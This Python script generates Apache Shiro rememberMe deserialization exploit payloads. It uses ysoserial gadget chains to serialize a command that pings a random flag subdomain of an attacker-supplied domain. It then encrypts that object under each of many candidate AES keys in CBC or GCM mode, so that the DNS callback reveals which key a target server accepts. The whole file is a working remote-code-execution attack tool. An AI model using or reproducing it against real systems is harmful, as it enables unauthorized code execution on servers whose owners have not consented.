import sys
import os
import uuid
import random
import string
import subprocess
import json
import base64
import argparse
from Crypto.Cipher import AES

def encode_rememberme(domain, key, ciphertype, gadget):
    popen = subprocess.Popen(['java', '-jar', '../ysoserial-0.0.6-SNAPSHOT-all.jar', gadget, 'ping'+' '+domain], stdout=subprocess.PIPE)
    # gadget: "CommonsCollections5"

    if ciphertype == 'CBC':
        payload = CBCCipher(key, popen.stdout.read())
    if ciphertype == 'GCM':
        payload = GCMCipher(key, popen.stdout.read())

    return payload

def CBCCipher(key, file_body):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def GCMCipher(key, file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)
    ciphertext, tag = cipher.encrypt_and_digest(file_body)
    ciphertext = ciphertext + tag
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext

if __name__ == '__main__':

    keys= []
    flags = []
    payloads = []
    key_flag = {}

    with open('keys_bak.txt', "r", encoding='utf8') as f:
        for line in f:
            keys.append(line.strip())  ## 注意strip()掉换行符
    #print(keys)

    for key in keys:
        flag = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
        flags.append(flag)
        key_flag[key] = flag

    with open('./key_flag.json', "w", encoding='utf-8') as json_file:
        json.dump(key_flag, json_file, ensure_ascii=False, indent=6)

    parser = argparse.ArgumentParser()
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-D', '--domain', help='CipherType, GCM or CBC', required=True)
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    parser.add_argument('-M', '--gadget', help='ysoserial gadget', required=True)
    args = parser.parse_args()

    for i in range(len(keys)):
        payload = encode_rememberme(flags[i]+'.'+args.domain, keys[i], args.ciphertype, args.gadget)
        payloads.append(payload.decode())
    with open('./payload.txt', 'w', encoding='utf-8') as f:
        for i in payloads:
            f.write(i+'\n')
